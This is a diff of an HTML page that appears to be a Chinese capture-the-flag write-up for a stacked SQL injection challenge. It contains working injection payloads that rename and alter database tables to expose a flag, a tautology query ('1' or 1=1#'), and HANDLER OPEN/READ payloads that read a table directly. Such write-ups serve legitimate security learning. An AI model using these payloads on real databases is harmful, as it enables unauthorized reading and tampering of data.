@@ -426,10 +426,13 @@
 <p>把words改成随便其他的，把1919810931114514改名为words，并且把新words(原1919810931114514)里添加一列id;</p>
 <p>再把flag列改成data,====这样以后，系统默认输出的内容就是flag里的内容了。</p>
 <p>代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);#&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">出现一条分界线表示执行成功，执行&#96;1&#39; or 1&#x3D;1#&#96;输出flag。</span><br><span class="line"></span><br><span class="line">还有两种相似方法：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>1’;HANDLER <code>1919810931114514</code> OPEN;HANDLER <code>1919810931114514</code> READ FIRST;#</p>
-<p>1’;HANDLER <code>1919810931114514</code> OPEN;HANDLER <code>1919810931114514</code> READ FIRST;HANDLER <code>1919810931114514</code> CLOSE;#</p>
-<p>```</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);#</span><br></pre></td></tr></table></figure>
+
+
+<p>出现一条分界线表示执行成功，执行<code>1&#39; or 1=1#</code>输出flag。</p>
+<p>还有两种相似方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;HANDLER &#96;1919810931114514&#96; OPEN;HANDLER &#96;1919810931114514&#96; READ FIRST;#</span><br><span class="line"></span><br><span class="line">1&#39;;HANDLER &#96;1919810931114514&#96; OPEN;HANDLER &#96;1919810931114514&#96; READ FIRST;HANDLER &#96;1919810931114514&#96; CLOSE;#</span><br></pre></td></tr></table></figure>
+
 <p><strong><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</strong></p>
 <h4 id="！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！"><a href="#！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！" class="headerlink" title="！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！"></a>！！！！这次的菜鸡博客就到这吧，我要去吃饭，睡觉，打六花了！！！</h4><p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/inhhdex.jpg" alt="inhhdex"></p>
 <p><img src="http://cdn.jsdelivr.net/gh/overnight-miss-you/test/timsdsg.gif" alt="timsdsg"></p>
